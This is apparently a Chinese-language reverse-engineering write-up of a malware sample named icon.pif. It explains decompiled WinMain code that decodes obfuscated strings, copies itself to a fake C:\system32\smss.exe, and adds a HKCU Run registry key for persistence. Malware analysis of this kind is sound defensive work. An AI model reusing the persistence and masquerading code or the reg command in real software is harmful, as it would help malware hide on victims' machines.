# 子样本 icon.pfi iDmzQtvReUSCdTn 行为一分析

启动参数是

```c
zWbTLWgKymXMDwZ
```

行为分析

把icon.pif复制到路径下C:\system32\smss.exe

所以icon.pif 文件和 C:\system32\smss.exe 文件是一样的

然后利用 CreateProcessW执行下面这个语句

```c
reg add hkcu\software\microsoft\windows\currentversion\run /d "\"C:\system32\smss.exe\" zWbTLWgKymXMDwZ" /t REG_SZ /v "System" /f
```

然后又创建一个进程

```c
C:\system32\smss.exe zWbTLWgKymXMDwZ "C:\ProgramData\Icon.pif"
```

然后就退出了 

- 代码分析如下
    
    ```c
    int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
    {
      __int64 lp_iDmzQtvReUSCdTn_a; // rax
      void **arg1; // rax
      bool cmp_data; // bl
      FARPROC api_GetModuleFileNameW; // rax
      __int64 j; // rcx
      __int16 zero; // ax
      __int64 sz_system32; // rax
      WCHAR *lp_tmp1; // rcx
      bool mem; // zf
      __int64 k; // rdx
      __int16 mem2; // ax
      FARPROC api_CreateDirectoryW; // rax
      __int64 str_smss_exe; // rax
      WCHAR *lp_tmp2; // rcx
      __int64 v18; // rdx
      __int16 v19; // ax
      FARPROC api_CopyFileW; // rax
      void *sz_System; // rax
      __int64 arg_zWbTLWgKymXMDwZ; // rax
      void *xx; // rax
      FARPROC api_CreateProcessW; // rax
      FARPROC api_CloseHandl2; // rax
      FARPROC api_CloseHandle; // rax
      void *sz_zWbTLWgKymXMDwZ; // rax
      FARPROC api_api_CreateProcessW2; // rax
      FARPROC api_CloseHandl3; // rax
      FARPROC api_CloseHandl4; // rax
      void *sz_zWbTLWgKymXMDw; // rax
      void **v33; // rax
      bool check_value; // bl
      FARPROC api_SetUnhandledExceptionFilter; // rax
      FARPROC api_SetErrorMode; // rax
      void **v37; // rax
      FARPROC api_WSAStartup; // rax
      int v39; // eax
      FARPROC api_sleeap; // rax
      FARPROC api_WSAStartup2; // rax
      __int64 (*api_GetTickCount)(void); // rax
      unsigned int time_1; // eax
      int i; // ebx
      __int64 v45; // rdx
      __int64 v46; // rcx
      __int64 v47; // r8
      int v48; // esi
      FARPROC API; // rax
      FARPROC v50; // rax
      FARPROC v51; // rax
      FARPROC v52; // rax
      FARPROC v53; // rax
      void *lp_iDmzQtvReUSCdTn_a2; // [rsp+50h] [rbp-B0h]
      void *sz_system32_2; // [rsp+50h] [rbp-B0h]
      void *Blockb; // [rsp+50h] [rbp-B0h]
      void *Blockc; // [rsp+50h] [rbp-B0h]
      __int16 sz_buf2[260]; // [rsp+58h] [rbp-A8h] BYREF
      void *v59; // [rsp+260h] [rbp+160h]
      wchar_t Buffer[260]; // [rsp+268h] [rbp+168h] BYREF
      __int128 v61; // [rsp+470h] [rbp+370h] BYREF
      __int64 v62; // [rsp+480h] [rbp+380h]
      __int128 v63; // [rsp+488h] [rbp+388h] BYREF
      __int64 v64; // [rsp+498h] [rbp+398h]
      DOUBLE pvtime; // [rsp+4A0h] [rbp+3A0h] BYREF
      struct _SYSTEMTIME SystemTime; // [rsp+4A8h] [rbp+3A8h] BYREF
      int v67; // [rsp+4C0h] [rbp+3C0h] BYREF
      __int128 v68; // [rsp+4C8h] [rbp+3C8h]
      __int128 v69; // [rsp+4D8h] [rbp+3D8h]
      __int128 v70; // [rsp+4E8h] [rbp+3E8h]
      __int128 v71; // [rsp+4F8h] [rbp+3F8h]
      __int128 v72; // [rsp+508h] [rbp+408h]
      __int128 v73; // [rsp+518h] [rbp+418h]
      int v74; // [rsp+530h] [rbp+430h] BYREF
      __int128 v75; // [rsp+538h] [rbp+438h]
      __int128 v76; // [rsp+548h] [rbp+448h]
      __int128 v77; // [rsp+558h] [rbp+458h]
      __int128 v78; // [rsp+568h] [rbp+468h]
      __int128 v79; // [rsp+578h] [rbp+478h]
      __int128 v80; // [rsp+588h] [rbp+488h]
      void *Block; // [rsp+5A0h] [rbp+4A0h] BYREF
      WCHAR v82[259]; // [rsp+5A8h] [rbp+4A8h] BYREF
      WCHAR w_C; // [rsp+7AEh] [rbp+6AEh] BYREF
      wchar_t path_self[1024]; // [rsp+7B0h] [rbp+6B0h] BYREF
      __int16 sz_buf[1024]; // [rsp+FB0h] [rbp+EB0h] BYREF
      WCHAR process_name[1024]; // [rsp+17B0h] [rbp+16B0h] BYREF
    
      memset(sz_buf, 0, sizeof(sz_buf));
      memset(path_self, 0, sizeof(path_self));
      memset(process_name, 0, sizeof(process_name));
      v74 = 104;
      v67 = 104;
      v63 = 0i64;
      v64 = 0i64;
      v61 = 0i64;
      v62 = 0i64;
      v75 = 0i64;
      v76 = 0i64;
      v77 = 0i64;
      v78 = 0i64;
      v79 = 0i64;
      v80 = 0i64;
      v68 = 0i64;
      v69 = 0i64;
      v70 = 0i64;
      v71 = 0i64;
      v72 = 0i64;
      v73 = 0i64;
      if ( *sub_1400127CC() < 2 )
        return 0;
      lp_iDmzQtvReUSCdTn_a = str_decode("JR-2Soh2YO5lXb7qfhy");
      lp_iDmzQtvReUSCdTn_a2 = lp_iDmzQtvReUSCdTn_a;
      if ( lp_iDmzQtvReUSCdTn_a )
        A2W(sz_buf2, 0x104ui64, L"%S", lp_iDmzQtvReUSCdTn_a);
      else
        A2W(sz_buf2, 0x104ui64, L" ");
      arg1 = sub_1400127D4();
      cmp_data = wcsicmp(*(*arg1 + 1), sz_buf2) == 0;// 校验输入参数和自带的参数是否匹配
      if ( lp_iDmzQtvReUSCdTn_a2 )
        free(lp_iDmzQtvReUSCdTn_a2);
      if ( cmp_data )                               // 分为带参数启动和不带参数启动
      {
        api_GetModuleFileNameW = getAPI("fCBuJQuR0-ms81ds8pWM8y");
        if ( (api_GetModuleFileNameW)(0i64, sz_buf, 1024i64) )
        {
          j = 0i64;
          do
          {
            zero = sz_buf[j];
            path_self[j++] = zero;
          }
          while ( zero );
          wcsrchr(path_self, '\\')[1] = 0;          // 查找最后面的\\,并把它变为0
          sz_system32 = str_decode("RFYAdL1Qspdy");
          sz_system32_2 = sz_system32;
          if ( sz_system32 )
            A2W(sz_buf2, 0x104ui64, L"%S", sz_system32);
          else
            A2W(sz_buf2, 0x104ui64, L" ");          // 结果变为w版本 system32
          lp_tmp1 = &w_C;                           // 这里和上面的东西相互呼应, 遍历\x00 C:/ \x00 con.pif
          do
          {
            mem = lp_tmp1[1] == 0;                  // 第0位,默认是0
            ++lp_tmp1;
          }
          while ( !mem );                           // 最后指针指向{ C:/ \x00 con.pif }其中的00
          k = 0i64;
          do
          {
            mem2 = sz_buf2[k];
            lp_tmp1[k++] = mem2;
          }
          while ( mem2 );                           // 字符串拼接为C:/ststem32
          if ( sz_system32_2 )
            free(sz_system32_2);
          api_CreateDirectoryW = getAPI("VU-EfBgFEqeL0qJmjBTT");// CreateDirectoryW
          (api_CreateDirectoryW)(path_self, 0i64);  // 创建目录是 C:\system32
          str_smss_exe = str_decode("n-LQ\\KtJ7.n_C");
          Blockb = str_smss_exe;
          if ( str_smss_exe )
            A2W(sz_buf2, 0x104ui64, L"%S", str_smss_exe);// 变为 \smss.exe
          else
            A2W(sz_buf2, 0x104ui64, L" ");
          lp_tmp2 = &w_C;
          do
          {
            mem = lp_tmp2[1] == 0;
            ++lp_tmp2;
          }
          while ( !mem );                           // 最后指向  C:\system32 末尾
          v18 = 0i64;
          do
          {
            v19 = sz_buf2[v18];
            lp_tmp2[v18++] = v19;                   // 结构就是\smss.exe
          }
          while ( v19 );
          if ( Blockb )
            free(Blockb);
          api_CopyFileW = getAPI("d-b9-sK4_lToe");
          if ( (api_CopyFileW)(sz_buf, path_self, 0i64) )// 把icon.pif复制到路径下C:\system32\smss.exe
          {
            sz_System = str_decode("i83eJplRF1");
            v59 = sz_System;
            if ( sz_System )
              A2W(Buffer, 0x104ui64, L"%S", sz_System);// 变为System
            else
              A2W(Buffer, 0x104ui64, L" ");
            arg_zWbTLWgKymXMDwZ = str_decode("LFHeLlC0ilOfIpRl14q");
            Blockc = arg_zWbTLWgKymXMDwZ;
            if ( arg_zWbTLWgKymXMDwZ )
              A2W(sz_buf2, 0x104ui64, L"%S", arg_zWbTLWgKymXMDwZ);// 变为w版本  zWbTLWgKymXMDwZ
            else
              A2W(sz_buf2, 0x104ui64, L" ");
            xx = str_decode(
                   "_FgD9Ol -_H 7SXV\\9ZuU4LRP\\VHoNZ5psc\\reEyp4f\\o5JRPxc4PNfHpx\\Rwx /n \"\\\"%f\\\" %5\" /9 8bIxX8 /Y \"%9\" /s");
            Block = xx;                             // 解码 reg add hkcu\software\microsoft\windows\currentversion\run /d "\"%s\" %s" /t REG_SZ /v "%s" /f
            if ( xx )
              A2W(v82, 0x104ui64, L"%S", xx);
            else
              A2W(v82, 0x104ui64, L" ");
            wsprintfW(process_name, v82, path_self, sz_buf2, Buffer);// 于是变为了很长一串
                                                    // reg add hkcu\software\microsoft\windows\currentversion\run /d "\"C:\system32\smss.exe\" zWbTLWgKymXMDwZ" /t REG_SZ /v "System" /f
            if ( Block )
              free(Block);
            Block = 0i64;
            if ( Blockc )
              free(Blockc);
            if ( v59 )
              free(v59);
            DWORD1(v71) = 1;
            WORD4(v71) = 0;
            api_CreateProcessW = getAPI("PDURzRqAqd3z4sqdmz");
            (api_CreateProcessW)(
              0i64,
              process_name,                         // 执行了一个注册表的添加的操作
              0i64,
              0i64,
              0,
              0,
              0i64,
              0i64,
              &v67,
              &v61,
              0i64);
            api_CloseHandl2 = getAPI("JROEVNqAXuQefND");
            (api_CloseHandl2)(v61);
            api_CloseHandle = getAPI("JROEVNqAXuQefND");
            (api_CloseHandle)(*(&v61 + 1));
            sz_zWbTLWgKymXMDwZ = str_decode("LFHeLlC0ilOfIpRl14q");
            v59 = sz_zWbTLWgKymXMDwZ;
            if ( sz_zWbTLWgKymXMDwZ )
              A2W(Buffer, 0x104ui64, L"%S", sz_zWbTLWgKymXMDwZ);
            else
              A2W(Buffer, 0x104ui64, L" ");
            wsprintfW(process_name, L"%s %s \"%s\"", path_self, Buffer, sz_buf);
            if ( v59 )
              free(v59);
            DWORD1(v78) = 1;
            WORD4(v78) = 0;
            api_api_CreateProcessW2 = getAPI("PDURzRqAqd3z4sqdmz");
            (api_api_CreateProcessW2)(
              0i64,
              process_name,                         // C:\system32\smss.exe zWbTLWgKymXMDwZ "C:\Icon.pif"
              0i64,
              0i64,
              0,
              0,
              0i64,
              0i64,
              &v74,
              &v63);
            api_CloseHandl3 = getAPI("JROEVNqAXuQefND");
            (api_CloseHandl3)(v63);
            api_CloseHandl4 = getAPI("JROEVNqAXuQefND");
            (api_CloseHandl4)(*(&v63 + 1));
          }
        }
      }
      else
      {
      	行为2
      }
       
      return 0;
    }
    ```
    
    其中值得注意的是
    
    以前的运行参数是
    
    ```c
    iDmzQtvReUSCdTn
    ```
    
    之后的运行参数发生了变化
    
    ```c
    zWbTLWgKymXMDwZ
    ```
    
    这就导致了行为不同
    
    并且行为2的参数又分为2个类
    

其实要注意的是

以前的启动参数是 `iDmzQtvReUSCdTn`

现在的启动参数是 `zWbTLWgKymXMDwZ "C:\ProgramData\Icon.pif"`

注册表启动项的启动参数是 `zWbTLWgKymXMDwZ` 

后面就再次分析一下